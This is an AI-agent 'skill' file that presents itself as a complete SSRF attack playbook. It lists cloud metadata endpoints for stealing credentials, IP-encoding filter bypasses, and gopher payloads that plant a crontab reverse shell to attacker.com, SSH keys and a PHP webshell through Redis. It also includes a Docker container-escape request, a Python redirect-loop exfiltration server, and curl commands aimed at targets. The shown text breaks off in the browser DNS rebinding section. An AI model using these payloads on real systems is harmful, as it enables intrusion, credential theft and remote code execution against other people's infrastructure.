---
name: injection-ssrf
description: >-
  SSRF complete attack playbook. Covers URL filter bypass (12 IP encoding variants/DNS rebinding/redirect chains), cloud metadata (AWS IMDSv1-v2/GCP/Azure/Alibaba/Oracle 6-platform matrix), protocol exploitation (gopher Redis RCE/file/dict), blind SSRF escalation (redirect loop exfiltration for Go/curl targets), URL parser differentials (Node.js/PHP/Python/Java/Go), and PDF/headless browser SSRF. Load when server fetches user-supplied URLs.
---

# SKILL: Server-Side Request Forgery (SSRF) — Complete Attack Playbook

> Expert SSRF techniques. Covers URL filter bypass, cloud metadata endpoints, protocol exploitation, blind SSRF detection, redirect loop exfiltration, URL parser differentials, PDF/headless browser SSRF, and chaining to RCE.

---

## INTERNAL NAVIGATION INDEX

| # | Section | Content |
|---|---|---|
| 1 | [Quick Start](#1-quick-start) | First-pass payloads, host validation bypass families, protocol routing |
| 2 | [Finding SSRF Surface](#2-finding-ssrf-surface) | Parameter names, less obvious vectors |
| 3 | [Basic Confirmation Methodology](#3-basic-confirmation-methodology) | Collaborator, time-based, localhost services |
| 4 | [Cloud Metadata Endpoints](#4-cloud-metadata-endpoints) | AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba, Oracle, K8s, Hetzner, OpenStack |
| 5 | [IP Address Filter Bypass](#5-ip-address-filter-bypass-techniques) | Localhost variants, 169.254 variants, private ranges, DNS bypass |
| 6 | [URL Scheme Attacks](#6-url-scheme-attacks) | file://, dict://, gopher://, sftp://, ldap:// |
| 7 | [Blind SSRF Detection & Escalation](#7-blind-ssrf-detection--escalation) | OOB, timing, redirect loop exfiltration |
| 8 | [Internal Service Exploitation](#8-internal-service-exploitation) | Docker API, Elasticsearch, Redis, Spring Boot |
| 9 | [SSRF + Filter Bypass Decision Tree](#9-ssrf--filter-bypass-decision-tree) | Complete decision flow |
| 10 | [URL Parser Differential Table](#10-url-parser-differential-table) | Authority, backslash, fragment, null byte, IPv6, port, file protocol |
| 11 | [Gopher Payload Recipes](#11-gopher-payload-recipes) | Redis, MySQL, SMTP, FastCGI, Memcached, encoding rules |
| 12 | [DNS Rebinding Deep Dive](#12-dns-rebinding-deep-dive) | Attack flow, TTL manipulation, TOCTOU, IMDSv2 bypass |
| 13 | [PDF / Screenshot Generator SSRF](#13-pdf--screenshot-generator-ssrf) | wkhtmltopdf, WeasyPrint, Chrome Headless, PhantomJS, exfiltration |
| 14 | [Additional Bypass Techniques](#14-additional-bypass-techniques) | Open redirect chaining, URL shorteners, Unicode, CRLF, protocol downgrade |
| 15 | [CVE Case Studies](#15-cve-case-studies) | WebLogic CVE-2014-4210, Kubernetes CVE-2020-8555/8562 |
| 16 | [The SSRF-Filter Mindset](#16-the-ssrf-filter-mindset) | Gap analysis philosophy |

---

## 1. QUICK START

### First-pass payloads

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### Host validation bypass families

| Validation Type | Try |
|---|---|
| blocks `localhost` string | `127.0.0.1`, `127.1`, `[::1]` |
| blocks direct IP only | internal DNS name, decimal/octal/hex IP forms |
| allowlist by prefix | username part, subdomain confusion, redirect chain |
| follows redirects | benign external URL redirecting to internal target |
| parses once, fetches twice | mixed encoding or DNS rebinding style targets |

### Protocol routing

| Goal | Protocol / Target |
|---|---|
| cloud credentials | metadata HTTP endpoints |
| internal HTTP admin | `http://127.0.0.1:port/` |
| Redis / raw TCP style abuse | `gopher://` |
| local file read candidate | `file://` |
| dictionary / banner tests | `dict://` |

---

## 2. FINDING SSRF SURFACE

Look for **any parameter containing DNS names, IP addresses, or URLs**:

```
loc=           url=        path=         endpoint=
imageUrl=      dest=       redirect=     uri=
callback=      load=       file=         resource=
link=          src=        data=         ref=
```

**Less obvious SSRF vectors**:
- PDF/screenshot generation (URL to capture)
- Webhook configuration fields
- Import/export via URL (CSV import, RSS/Atom feeds)
- OAuth redirect URI (sometimes triggers server-side fetch)
- `X-Forwarded-Host` / `X-Real-IP` headers in proxy chains
- XML `DOCTYPE` with external entity (`file://`, `http://`)
- GraphQL `@link` directive (federation)
- Content-Type: `text/html` pages parsed for `<link>` preload headers

---

## 3. BASIC CONFIRMATION METHODOLOGY

```
Step 1: Supply your Burp Collaborator / interact.sh URL
        → Check server initiates outbound connection (full SSRF confirmed)

Step 2: If no callback → test time-based (open port = fast, closed = slow/reset):
        Compare response time for:
        http://192.168.1.1:22   (likely open → fast)
        http://192.168.1.1:9999 (likely closed → slow/timeout)

Step 3: Try accessing localhost services:
        http://127.0.0.1:8080
        http://127.0.0.1:22
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:5984  (CouchDB)
        http://127.0.0.1:2375  (Docker daemon — critical!)
        http://127.0.0.1:4840  (internal admin)
```

---

## 4. CLOUD METADATA ENDPOINTS

### 4.1 AWS EC2

```
# IMDSv1 (no auth — most critical)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (token-based — bypass if SSRF can send PUT + custom headers)
# Step 1:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2:
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_FROM_STEP1
```

**If SSRF supports custom headers → full IMDSv2 bypass**.

```
# ECS Task Metadata (containers)
http://169.254.170.2/v2/credentials/<GUID>
# GUID from: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var

# Lambda environment
file:///proc/self/environ  → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

### 4.2 Google Cloud Platform (GCP)

```
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/machine-type
http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Alternative IP (if metadata.google.internal is blocked):
http://169.254.169.254/computeMetadata/v1/  (with header)

# Bypass header requirement (if SSRF doesn't support custom headers):
# Some older GCP versions allowed without header — worth trying
# Also try: Metadata-Flavor: Google\r\nX-Ignore:

# Legacy endpoint — may not require Metadata-Flavor header!
http://metadata.google.internal/computeMetadata/v1beta1/
```

### 4.3 Microsoft Azure

```
# Requires header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text

# Azure App Service (different IP!)
http://169.254.130.1/
```

### 4.4 DigitalOcean

```
# No auth header required
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/dns/nameservers
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
http://169.254.169.254/metadata/v1/floating_ip/ipv4/active
```

### 4.5 Alibaba Cloud (Aliyun)

```
# No auth header required
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/meta-data/region-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
http://100.100.100.200/latest/user-data
http://100.100.100.200/latest/meta-data/private-ipv4
http://100.100.100.200/latest/meta-data/eipv4
```

### 4.6 Oracle Cloud Infrastructure (OCI)

```
# Requires header: Authorization: Bearer Oracle
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v2/instance/  (v2 — requires auth header)
http://169.254.169.254/opc/v1/identity/cert.pem
http://169.254.169.254/opc/v1/identity/key.pem
http://169.254.169.254/opc/v1/identity/intermediate.pem
```

### 4.7 Kubernetes Service Account

```
# In-cluster service account token (file read via SSRF):
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API (from within cluster):
https://kubernetes.default.svc/api
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/api/v1/namespaces/default/pods
https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# kubelet API (often no auth on port 10255):
http://NODE_IP:10255/pods
http://NODE_IP:10255/spec

# etcd (critical — contains all cluster state):
http://NODE_IP:2379/v2/keys/
http://NODE_IP:2379/v2/keys/registry/secrets/

# kubectl proxy (if running):
http://127.0.0.1:8001/api/v1/namespaces/default/pods
```

### 4.8 Hetzner Cloud

```
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/private-networks
```

### 4.9 OpenStack

```
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data
http://169.254.169.254/openstack/latest/network_data.json
```

### 4.10 IPv6 Metadata Variants

```
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[fd00:ec2::254]/latest/meta-data/
# May bypass IPv4-only filters
```

---

## 5. IP ADDRESS FILTER BYPASS TECHNIQUES

When `169.254.169.254`, `127.0.0.1`, `localhost` are blocked:

### Localhost Variants

```
127.0.0.1
127.1
127.0.1
127.000.000.001    ← octal padding
0x7f000001         ← hex
2130706433         ← decimal (0x7f000001)
0177.0000.0000.0001  ← octal
[::]               ← IPv6 loopback
[::1]              ← IPv6 loopback
[::ffff:127.0.0.1] ← IPv4-mapped IPv6
```

### 169.254.169.254 Variants

```
169.254.169.254
2852039166               ← decimal
0xa9fea9fe               ← hex
0251.0376.0251.0376      ← octal
[::ffff:169.254.169.254] ← IPv6
169.254.169.254.nip.io   ← DNS rebinding service
```

### Private Network Ranges

```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
fc00::/7  ← IPv6 private
```

### Bypass Filter via DNS Input

If filter checks DNS-resolved IP (not hostname):

```
http://attacker.com/  ← DNS A record points to 169.254.169.254
```

Use DNS rebinding: initial lookup returns valid IP → passes filter → second request returns internal IP.

---

## 6. URL SCHEME ATTACKS

When `http://` is allowed or weakly filtered:

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp   ← reveals internal network ARP table
file:///proc/net/tcp   ← open network connections

dict://127.0.0.1:6379/INFO   ← Redis INFO command via dict://

gopher://127.0.0.1:6379/_INFO%0d%0a   ← Redis via gopher
gopher://127.0.0.1:9200/   ← Elasticsearch

sftp://attacker.com:11111/   ← triggers SFTP connection (credential hash)
ldap://attacker.com:389/     ← triggers LDAP bind
ftp://attacker.com/          ← triggers FTP connection
```

### Redis Gopher SSRF (full RCE potential)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 7. BLIND SSRF DETECTION & ESCALATION

When response doesn't reflect fetched content:

1. **Burp Collaborator / interact.sh**: check for DNS + HTTP request from server
2. **Pingback/webhook abuse**: configure application's own webhook to your URL
3. **Timing analysis**: Internal open port vs closed port response time difference
4. **Error analysis**: Different error messages for "host not found" vs "connection refused" vs "timeout" reveal internal network topology
5. **Redirect loop exfiltration**: Force target to leak response via redirect limit behavior

### 7.1 Redirect Loop Exfiltration

When blind SSRF is confirmed (OOB callback received) but response content is invisible, use HTTP redirect loops to force the target's HTTP client to leak fetched content.

#### Core Idea

HTTP clients have a redirect-follow limit. When exceeded, different libraries expose the **last response**, **error message containing URL**, or **log entries** — turning blind SSRF into partial/full read.

#### HTTP Client Redirect Behavior (Fingerprinting + Exploitation)

| HTTP Library | Redirect Limit | Behavior After Limit | Exploitability |
|---|---|---|---|
| **Go net/http** | 10 | **Returns last response** | HIGH — direct content leak |
| **curl (libcurl)** | 50 | **Returns last response** | HIGH — direct content leak |
| Python requests | 30 | TooManyRedirects exception | MEDIUM — error msg may contain URL |
| Node.js fetch | 20 | TypeError thrown | LOW — generic error |
| Java HttpURLConnection | 20 | ProtocolException | MEDIUM — exception may log URL |
| PHP file_get_contents | 20 | Returns false + E_WARNING | MEDIUM — warning may expose path |

**Key insight**: Go and curl targets are most valuable — they return the actual last response body.

#### Attack Flow

```
1. Deploy redirect server on VPS (attacker.com:8080)
2. Trigger blind SSRF: target requests http://attacker.com:8080/start
3. VPS responds 302 → http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
4. Target follows redirect, gets metadata response
5. VPS creates redirect loop to exhaust client limit
6. Client hits limit → leaks response via error/return value
```

#### Redirect Loop Server (Python)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        # Phase 1: Initial redirect to internal target
        if path.startswith('/start'):
            target = urllib.parse.unquote(path.split('target=')[1])
            self.send_response(302)
            self.send_header('Location', target)
            self.end_headers()
        # Phase 2: Bounce loop between /a and /b
        elif path.startswith('/a'):
            self.send_response(302)
            self.send_header('Location', '/b')
            self.end_headers()
        elif path.startswith('/b'):
            self.send_response(302)
            self.send_header('Location', '/a')
            self.end_headers()
        # Phase 3: Reflect — encode response content into redirect URL
        elif path.startswith('/reflect'):
            self.send_response(302)
            self.send_header('Location', f'http://attacker.com:8080/a')
            self.end_headers()

    def log_message(self, format, *args):
        # Log all requests — contains leaked paths/data
        print(f"[REQUEST] {self.client_address[0]} → {self.path}")

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```

#### Three Exploitation Paths

**Path 1: Error Message Leakage**
- Encode internal response into redirect URL
- When client errors on redirect limit, error message contains the URL with encoded data
- Works when: target app surfaces HTTP client exceptions to user (debug mode, verbose errors)

**Path 2: Response Body Differential**
- After redirect loop exhausts, observe target's returned error page
- Content-Length or status code may vary based on last redirect destination
- Boolean blind extraction: different internal paths → different error page sizes

**Path 3: OOB + Redirect Path Encoding**
- Redirect server logs each request path
- Encode internal response bits into DNS queries or HTTP paths
- Each redirect loop iteration leaks one piece of information

```python
# OOB exfil via DNS — encode data into subdomain
# VPS redirects target to:
#   http://{base64_chunk}.leak.attacker.com/next
# Attacker's DNS server logs the subdomain = leaked data
```

#### Practical Usage

```bash
# Step 1: Confirm blind SSRF follows redirects
curl -X POST https://target.com/api/import \
  -d '{"url":"http://attacker.com:8080/start?target=http://attacker.com:8080/confirm"}'

# Step 2: If redirect followed, attempt metadata exfil
curl -X POST https://target.com/api/import \
  -d '{"url":"http://attacker.com:8080/start?target=http://169.254.169.254/latest/meta-data/"}'

# Step 3: Check VPS logs for leaked data
```

#### Fingerprinting Target HTTP Client via Redirect Count

```python
# Count how many redirects target follows before stopping
# Deploy: each /count/N redirects to /count/N+1
# Check VPS logs: last N reached = client's redirect limit
# 10 → Go net/http | 20 → Java/Node/PHP | 30 → Python | 50 → curl
```

#### Limitations & Prerequisites

- Target must follow HTTP redirects (some implementations disable redirect-follow)
- Content leak depends heavily on client library behavior
- Not universal — test redirect-follow first via OOB before investing time
- Keep loop count <=20 to avoid triggering WAF/rate-limit/DoS

---

## 8. INTERNAL SERVICE EXPLOITATION

### Docker API (2375 unauthenticated)

```
http://127.0.0.1:2375/v1.24/containers/json      ← list containers
http://127.0.0.1:2375/v1.24/images/json          ← list images
# Create privileged container → escape to host:
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch (9200 no-auth default)

```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis (6379 — no-auth common)

```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

### Internal Admin Panels

```
http://127.0.0.1:8080/admin
http://127.0.0.1:8443/admin
http://127.0.0.1:9000/actuator   ← Spring Boot actuator (exposed endpoints)
http://127.0.0.1:9000/actuator/shutdown
http://127.0.0.1:9000/actuator/env
```

---

## 9. SSRF + FILTER BYPASS DECISION TREE

```
SSRF parameter found?
├── Try http://169.254.169.254/ directly → blocked?
│   ├── Try decimal/hex/octal variants
│   ├── Try IPv6 variants [::ffff:169.254.169.254]
│   ├── Try DNS rebinding (nip.io, custom NS)
│   └── Try redirect: attacker.com → 169.254.169.254 (302)
│
├── Try http://127.0.0.1/ → blocked?
│   ├── Try 127.1 / 127.0.1 / 0x7f000001 / 2130706433
│   ├── Try localhost → might not be blocked
│   └── Try IPv6 [::1]
│
├── What protocols are allowed?
│   ├── dict:// → test Redis, Memcached
│   ├── gopher:// → full TCP data injection (target Redis/SMTP)
│   ├── file:// → local file read
│   └── sftp:// ldap:// ftp:// → network interactions
│
└── Blind SSRF → use Burp Collaborator
    ├── DNS-only → use DNS rebinding or SSRF with OOB DNS
    └── Follows redirects? → Redirect loop exfil (§7.1)
        ├── Fingerprint HTTP client (count redirects followed)
        ├── Go/curl target → direct response leak
        └── Others → OOB + path-encoded boolean blind
```

---

## 10. URL PARSER DIFFERENTIAL TABLE

Different URL parsers interpret ambiguous URLs differently. This is the core of SSRF filter bypass.

### 10.1 Authority Parsing (Who Is the Host?)

Test URL: `http://evil.com@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib.parse.urlparse` | `safe.com` | Treats `evil.com` as userinfo |
| Python `requests` | `safe.com` | Same as urllib |
| Java `java.net.URL` | `safe.com` | Userinfo before `@` |
| Java `java.net.URI` | `safe.com` | Same |
| PHP `parse_url` | `safe.com` | Userinfo before `@` |
| Node.js `url.parse` (legacy) | `safe.com` | Userinfo before `@` |
| Node.js `new URL()` (WHATWG) | `safe.com` | Same |
| Go `net/url.Parse` | `safe.com` | Same |
| cURL | `safe.com` | Sends to safe.com with auth evil.com |

**Exploit scenario**: filter checks host, request library resolves differently.

### 10.2 Backslash Handling

Test URL: `http://evil.com\@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib` | `evil.com\@safe.com` | Backslash NOT treated as separator |
| Python `requests` | `evil.com` | May treat `\` as path separator |
| Java `URL` | `evil.com\@safe.com` or error | Implementation-dependent |
| PHP `parse_url` | `safe.com` | Ignores backslash in authority |
| Node.js `url.parse` (legacy) | `evil.com` | `\` treated as `/` |
| Node.js `new URL()` | `evil.com` | `\` normalized to `/` |
| Go `net/url` | error or literal | Strict parsing |
| cURL | `evil.com` | Backslash treated as path separator |

### 10.3 Fragment (`#`) Handling

Test URL: `http://evil.com#@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib` | `evil.com` | `#` starts fragment, `@safe.com` in fragment |
| Python `requests` | `evil.com` | Same |
| Java `URL` | `evil.com` | Fragment stripped for connection |
| PHP `parse_url` | `evil.com` | `#` delimits fragment |
| Node.js `url.parse` | `evil.com` | Fragment parsed |
| cURL | `evil.com` | Fragment ignored for request |

**Exploit**: if filter uses parser that treats `#@safe.com` as fragment (sees `evil.com`), but the actual HTTP client sends to a different resolved host.

### 10.4 Null Byte / Encoded Separator

Test URL: `http://safe.com%00@evil.com/` and `http://safe.com%23@evil.com/`

| Parser | Behavior |
|---|---|
| Python `urllib` | `%00` may truncate at null in C-backed functions → sees `safe.com` |
| PHP `parse_url` | `%00` may truncate hostname → sees `safe.com` |
| Node.js `url.parse` | Decodes `%00` → potential truncation |
| Java `URL` | Usually rejects null byte |
| Go `net/url` | Usually rejects null byte |
| cURL (older) | May truncate at null → connects to `safe.com` but path leads to `evil.com` |

### 10.5 IPv6 Bracket Confusion

Test URL: `http://[::ffff:127.0.0.1]` and `http://[::ffff:169.254.169.254]`

| Parser | Behavior |
|---|---|
| Python `urllib` | Parses IPv6, resolves to mapped IPv4 |
| PHP `parse_url` | Parses IPv6 brackets correctly |
| Node.js | Parses IPv6 brackets |
| Java | Parses IPv6 brackets |
| Go | Parses IPv6 brackets |
| cURL | Connects to mapped IPv4 address |

**Exploit**: if filter blocks `127.0.0.1` but not `[::ffff:127.0.0.1]`.

### 10.6 Port Handling Differences

Test URL: `http://safe.com:80@evil.com/`

| Parser | Resolved Host |
|---|---|
| Python `urllib` | `evil.com` (treats `safe.com:80` as userinfo) |
| PHP `parse_url` | `evil.com` |
| Node.js `url.parse` | `evil.com` |
| Java `URL` | `evil.com` |

**Exploit**: filter sees `safe.com` in URL string via regex, but parser resolves to `evil.com`.

### 10.7 Triple-Slash File Protocol

Test URL: `file:///etc/passwd` vs `file://evil.com/etc/passwd`

| Parser | Behavior |
|---|---|
| cURL | `file:///etc/passwd` reads local; `file://evil.com/etc/passwd` reads from SMB on Windows |
| Python `urllib` | `file:///etc/passwd` reads local |
| Java | `file:///etc/passwd` reads local |
| Node.js | Depends on fetch library implementation |

---

## 11. GOPHER PAYLOAD RECIPES

`gopher://` allows sending raw TCP data — powerful when SSRF is combined with internal services that speak plaintext protocols.

### 11.1 Gopher → Redis

**Write crontab reverse shell**:

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A*/1 * * * * bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

Decoded RESP commands:
```
FLUSHALL
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

**Write SSH authorized_keys**:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20key%20%22%5Cn%5Cnssh-rsa%20AAAA...%20attacker%40host%5Cn%5Cn%22%0D%0ASAVE%0D%0A
```

**Write PHP webshell via Redis**:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ASAVE%0D%0A
```

### 11.2 Gopher → MySQL (No Password)

Target: MySQL with `skip-grant-tables` or empty root password.

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00
```

**Tool: Gopherus** generates these payloads automatically:

```bash
python gopherus.py --exploit mysql
# Enter username: root
# Enter query: SELECT * FROM mysql.user

python gopherus.py --exploit redis
# Enter: php (for webshell)
```

### 11.3 Gopher → SMTP

Send email via internal SMTP server (port 25):

```
gopher://127.0.0.1:25/_HELO%20attacker%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cadmin%40target.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AYou%20are%20vulnerable%0D%0A.%0D%0AQUIT%0D%0A
```

Decoded:
```
HELO attacker
MAIL FROM:<attacker@evil.com>
RCPT TO:<admin@target.com>
DATA
Subject: SSRF Test

You are vulnerable
.
QUIT
```

### 11.4 Gopher → FastCGI (PHP-FPM)

Execute PHP code via FastCGI protocol on port 9000:

```bash
# Use Gopherus:
python gopherus.py --exploit fastcgi
# Enter: /var/www/html/index.php
# Enter command: id
```

The generated payload sends a FastCGI `BEGIN_REQUEST` + `PARAMS` + `STDIN` that sets `PHP_VALUE` to `auto_prepend_file=php://input` and includes the command in the request body.

### 11.5 Gopher → Memcached

```
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_get%20session:SESSIONID%0D%0A
gopher://127.0.0.1:11211/_set%20session:VICTIM%200%20900%2050%0D%0A{"user":"admin","role":"superadmin","id":1}%0D%0A
```

### 11.6 Gopher URL Encoding Rules

```
\r → %0D
\n → %0A
space → %20
/ → %2F (in path component; first / after host is literal)
_ after gopher://host:port/ → required prefix (discarded by protocol)
```

Double-encode if the SSRF endpoint URL-decodes once before fetching:
```
%0D%0A → %250D%250A
```

---

## 12. DNS REBINDING DEEP DIVE

### 12.1 The Problem DNS Rebinding Solves

Many SSRF filters work by:
1. Resolving the hostname to an IP
2. Checking if the IP is internal/blocked
3. If allowed, making the HTTP request

DNS rebinding exploits the **time gap between steps 2 and 3**.

### 12.2 Attack Flow

```
1. Attacker controls DNS for evil.com
2. Victim app receives URL: http://evil.com/
3. App resolves evil.com → 1.2.3.4 (public IP, passes filter)
4. App makes HTTP request to evil.com
5. DNS TTL has expired; new resolution: evil.com → 127.0.0.1
6. HTTP library resolves again → gets 127.0.0.1
7. Request goes to 127.0.0.1 → internal resource accessed
```

### 12.3 TTL Manipulation

```
# Authoritative DNS server configuration:
# Response 1 (filter check): A 1.2.3.4, TTL=0
# Response 2 (actual request): A 127.0.0.1, TTL=0

# TTL=0 forces re-resolution on every request
# Some resolvers enforce minimum TTL (30s, 60s) — timing matters
```

### 12.4 Tools and Services

```bash
# rbndr.us — free DNS rebinding service
# Format: FIRST_IP.SECOND_IP.rbndr.us
# Example:
http://7f000001.01020304.rbndr.us/
# Alternates between 127.0.0.1 and 1.2.3.4

# ceye.io — DNS rebinding + OOB exfil
# singularity — full DNS rebinding attack framework
# https://github.com/nccgroup/singularity

# Custom authoritative DNS (Python):
# Use dnslib to serve alternating A records with TTL=0
```

### 12.5 DNS Rebinding vs TOCTOU

If the application resolves DNS **once** and uses the resolved IP directly, DNS rebinding won't work. Look for:

```
# Vulnerable pattern (two resolutions):
ip = dns_resolve(hostname)     # check
if not is_internal(ip): allow
response = http_get(hostname)  # use (re-resolves!)

# Not vulnerable (single resolution):
ip = dns_resolve(hostname)     # check
if not is_internal(ip): allow
response = http_get(ip)        # uses resolved IP directly
```

### 12.6 DNS Rebinding for IMDSv2 Bypass

```
# IMDSv2 blocks requests with X-Forwarded-For header
# But DNS rebinding hits from the instance itself:
1. SSRF reaches attacker-controlled DNS name
2. First resolution → public IP (passes filter)
3. Second resolution → 169.254.169.254
4. Request reaches IMDS from instance's own network → no X-Forwarded-For → success
```

### 12.7 Bypass Scenarios

| Defense | DNS Rebinding Bypass |
|---|---|
| IP blacklist check at DNS resolution time | TTL=0: resolution returns safe IP → passes check → re-resolve returns internal IP |
| Single DNS lookup cached | Use race condition: parallel requests, one resolves to external, other to internal |
| Application pins DNS result | Not all HTTP libraries pin; some re-resolve on redirect |

### 12.8 Browser-Side DNS Rebinding

```
# Different from server-side SSRF — targets victim's browser:
# 1. Victim visits attacker.com (DNS resolves to attacker IP)
# 2. JavaScript makes request to attacker.com (same-origin)
# 3. DNS TTL expires, re-resolves to 127.0.0.1 or internal IP
# 4. Browser makes same-origin request → hits internal service
